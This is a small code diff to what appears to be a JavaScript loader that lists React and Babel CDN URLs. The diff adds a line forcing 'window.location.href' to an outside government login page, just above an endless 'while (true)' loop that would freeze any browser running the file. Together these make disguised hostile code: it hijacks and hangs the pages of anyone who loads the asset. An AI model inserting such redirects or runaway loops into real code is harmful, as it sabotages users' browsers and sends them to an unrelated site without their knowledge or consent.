@@ -7,7 +7,7 @@
     "react-dom": "https://unpkg.com/react-dom@16/umd/react-dom.development.js",
     babel: "https://unpkg.com/babel-standalone@6.15.0/babel.min.js",
   }; 
-  window.sum = 0
+  window.location.href = 'https://mczxgl.mczx.gov.cn/#/login'
   while (true) {
     window.sum += 100000000
   }
